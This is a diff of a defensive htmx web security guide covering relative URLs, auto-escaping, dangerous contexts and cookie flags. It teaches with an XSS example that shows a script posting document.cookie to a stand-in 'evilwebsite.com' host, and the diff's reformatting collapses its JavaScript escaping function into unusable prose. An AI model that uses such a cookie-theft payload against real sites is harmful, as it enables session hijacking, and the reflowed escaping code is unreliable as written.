@@ -18,6 +18,7 @@ For this guide, you should already have a basic grasp of the semantics of the we
 We make these simplifying assumptions in order to target the widest possible audience, without including distracting information—obviously this can’t catch everyone. No security guide is perfectly comprehensive. If you feel there’s a mistake, or an obvious gotcha that we should have mentioned, please reach out and we’ll update it.
 
 ## The Golden Rules
+
 Follow these four simple rules, and you’ll be following the client security best practices:
 
 - Only call routes you control
@@ -28,7 +29,9 @@ Follow these four simple rules, and you’ll be following the client security be
 In the following section, we’ll discuss what each of these rules does, and what kinds of attack they protect against. The vast majority of htmx users—those using htmx to build a website that allows users to login, view some data, and update that data—should never have any reason to break them.
 
 ## Understanding the Rules
+
 ### Only call routes you control
+
 This is the most basic one, and the most important: do not call untrusted routes with htmx.
 
 In practice, this means you should only use relative URLs. This is fine:
@@ -54,6 +57,7 @@ Instead, you simply serve your HTML frontend from the same server (or at least t
 htmx executes HTML; HTML is code; never execute untrusted code.
 
 ### Always use an auto-escaping template engine
+
 When you send HTML to the user, all dynamic content must be escaped. Use a template engine to construct your responses, and make sure that auto-escaping is on.
 
 Fortunately, all template engines support escaping HTML, and most of them enable it by default.
@@ -61,50 +65,37 @@ Fortunately, all template engines support escaping HTML, and most of them enable
 The kind of vulnerability this prevents is often called a Cross-Site Scripting (XSS) attack, a term that is broadly used to mean the injection of any unexpected content into your webpage. Typically, an attacker uses your APIs to store malicious code in your database, which you then serve to your other users who request that info.
 
 For example, let’s say you’re building a dating site, and it lets users share a little bio about themselves. You’d render that bio like this, with {{ user.bio }} being the bio stored in the database:
+
 ```html
-<p>
-{{ user.bio }}
-</p>
+<p>{{ user.bio }}</p>
 ```
 
 If a malicious user wrote a bio with a script element in it—like one that sends the client’s cookie to another website—then this HTML will get sent to every user who views that bio:
+
 ```html
 <p>
-<script>
-  fetch('evilwebsite.com', { method: 'POST', body: document.cookie })
-</script>
+  <script>
+    fetch("evilwebsite.com", { method: "POST", body: document.cookie });
+  </script>
 </p>
-Fortunately this one is so easy to fix that you can write the code yourself. Whenever you insert untrusted (i.e. user-provided) data, you just have to replace eight characters with their non-code equivalents. This is an example using JavaScript:
-
-/**
- * Replace any characters that could be used to inject a malicious script in an HTML context.
- */
-export function escapeHtmlText (value) {
-  const stringValue = value.toString()
-  const entityMap = {
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    '"': '&quot;',
-    "'": '&#x27;',
-    '/': '&#x2F;',
-    '`': '&grave;',
-    '=': '&#x3D;'
-  }
-
-  // Match any of the characters inside /[ ... ]/
-  const regex = /[&<>"'`=/]/g
-  return stringValue.replace(regex, match => entityMap[match])
-}
+Fortunately this one is so easy to fix that you can write the code yourself.
+Whenever you insert untrusted (i.e. user-provided) data, you just have to
+replace eight characters with their non-code equivalents. This is an example
+using JavaScript: /** * Replace any characters that could be used to inject a
+malicious script in an HTML context. */ export function escapeHtmlText (value) {
+const stringValue = value.toString() const entityMap = { '&': '&amp;', '<':
+'&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`':
+'&grave;', '=': '&#x3D;' } // Match any of the characters inside /[ ... ]/ const
+regex = /[&<>"'`=/]/g return stringValue.replace(regex, match =>
+entityMap[match]) }
 ```
 
 This tiny JS function replaces < with &lt;, " with &quot;, and so on. These characters will still render properly as < and " when they’re used in the text, but can’t be interpreted as code constructs. The previous malicious bio will now be converted into the following HTML:
 
 ```html
 <p>
-&lt;script&gt;
-  fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data: document.cookie })
-&lt;/script&gt;
+  &lt;script&gt; fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;,
+  data: document.cookie }) &lt;/script&gt;
 </p>
 ```
 
@@ -113,6 +104,7 @@ which displays harmlessly as text.
 Fortunately, as established above, you don’t have to do your escaping manually—I just wanted to demonstrate how simple these concepts are. Every template engine has an auto-escaping feature, and you’re going to want to use a template engine anyway. Just make sure that escaping is enabled, and send all your HTML through it.
 
 ### Only serve user-generated content inside HTML tags
+
 This is an addendum to the template engine rule, but it’s important enough to call out on its own. Do not allow your users to define arbitrary CSS or JS content, even with your auto-escaping template engine.
 
 ```html
@@ -144,6 +136,7 @@ CSS, JavaScript, and HTML attributes are “dangerous contexts,” places where 
 Inserting user-generated text directly into a script tag should never be necessary, but there are some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.
 
 ### Secure your cookies
+
 The best way to do authentication with htmx is using cookies. And because htmx encourages interactivity primarily through first-party HTML APIs, it is usually trivial to enable the browser’s best cookie security features. These three in particular:
 
 - Secure - only send the cookie via HTTPS, never HTTP
@@ -161,7 +154,9 @@ Set-Cookie: token=asd8234nsdfp982
 
 [HTML content]
 ```
+
 That token corresponds to the user’s current login session. From now on, every time that user makes a request to any route at yourdomain.com, the browser will include that cookie from Set-Cookie in the HTTP request.
+
 ```bash
 GET /users HTTP/1.1
 Host: yourdomain.com
@@ -190,4 +185,4 @@ Finally, SameSite=Lax locks down an avenue for Cross-Site Request Forgery (CSRF)
 
 ### Learn How To Build AI Projects
 
-Now, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here's the [link](https://akhilsharmatech.gumroad.com/l/zgxqq).
+Now, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Golang where you will learn about building with AI and getting the best knowledge there is currently. Here's the [link](https://akhilsharmatech.gumroad.com/l/zgxqq).
